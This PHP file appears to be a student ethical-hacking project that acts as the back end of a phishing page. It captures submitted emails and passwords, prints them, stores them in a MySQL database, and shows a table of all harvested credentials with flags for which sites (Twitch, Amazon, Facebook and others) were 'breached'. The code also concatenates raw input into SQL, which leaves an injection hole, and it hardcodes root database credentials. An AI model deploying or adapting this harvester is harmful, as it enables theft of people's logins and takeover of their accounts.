<?php 

// Add message
echo "<h1 style='color:red; text-decoration: underline;' align='center'>#CS378 Git Gud</h1>";

// Add syle
echo "<style>
          table {
 	      font-family: arial, sans-serif;
              border-collapse: collapse;
              width: 50%;
          }
          td, th {
              border: 1px solid black;
              text-align: left;
              padding: 8px;
          }  
          tr:nth-child(even) {
              background-color: #dddddd;
          }
       </style>";   

echo "<h3>Grabbed:</h3>"; 

// Grab credentials
$user = $_POST['email'];
$pass = $_POST['pass'];

// Display credentials
echo "<table>
          <tr> 
 	      <th>Username</th>
 	      <th>Password</th>
          </tr>
          <tr>
              <td>" . $user . "</td> 
              <td>" . $pass . "</td>
          </tr>
      </table>";

// Insert the credentials to the database
echo "<p>Adding to database...</p>";

$servername = "localhost";
$username = "root";
$password = "ethicalhacking";
$db = "ethicalhackingteam2";

// Create connection
$conn = mysqli_connect($servername, $username, $password, $db);

// Check connection
if (!$conn) {
    die("Connection failed: " . mysqli_connect_error());
}

// Create insert query
$insert = "INSERT INTO " . $db . " (username, password) VALUES ('" . $user . "','" . $pass . "')";

// Perform the query
if (mysqli_query($conn, $insert)) {
    echo "<p>Added successfully</p>";
} else {
    echo "Adding to database failed: " . mysqli_error($conn);
}

// Add script to perform website login
echo "<script>
          function breach(selected) {
              console.log('selected:', selected);
   	      document.getElementById('breachedText').innerHTML = selected.options[selected.selectedIndex].text;
          }
      </script>";

// Attempt to autheticate to several well-known websites - add a selector to do so
echo "<div id='breach'>";
echo "<p>Select a website to breach:</p>";
echo "<select id='breachSelector' onChange='breach(this)'>
          <option value='twitch' selected>Twitch</option>
          <option value='amazon'>Amazon</option>
      </select>";
echo "<p id='breachedText'>Twitch</p>";

echo "</div>";

// Display the breach statistics - all of the users
echo "<h3>Overall Breach Statistics:</h3>";
$all = "SELECT * FROM " . $db;
$result = mysqli_query($conn, $all);

if (!$result) {
    die("Grabbing the entire table failed " . mysqli_error($conn)); 
}

// Format bool that is given from MySQL
function displayBool($value) {
    return $value != 0 ? "True" : "False";
}

// Create table to display statistics
echo "<table>
	<tr>
	    <th>Username</th>
	    <th>Password</th>
            <th>Twitch</th>
 	    <th>Amazon</th>
 	    <th>YouTube</th>
 	    <th>Facebook</th>
 	    <th>Twitter</th>
 	    <th>Pinterest</th>
 	</tr>";

while ($row = mysqli_fetch_array($result)) {
    echo "<tr>
              <td>" . $row['username'] . "</td>
 	      <td>" . $row['password'] . "</td>
 	      <td>" . displayBool($row['sites_breached_twitch']) . "</td>
 	      <td>" . displayBool($row['sites_breached_amazon']) . "</td>
 	      <td>" . displayBool($row['sites_breached_youtube']) . "</td>
   	      <td>" . displayBool($row['sites_breached_facebook']) . "</td>
   	      <td>" . displayBool($row['sites_breached_twitter']) . "</td>
 	      <td>" . displayBool($row['sites_breached_pinterest']) . "</td>
  	  </tr>";
} 

echo "</table>";

mysqli_close();

?>
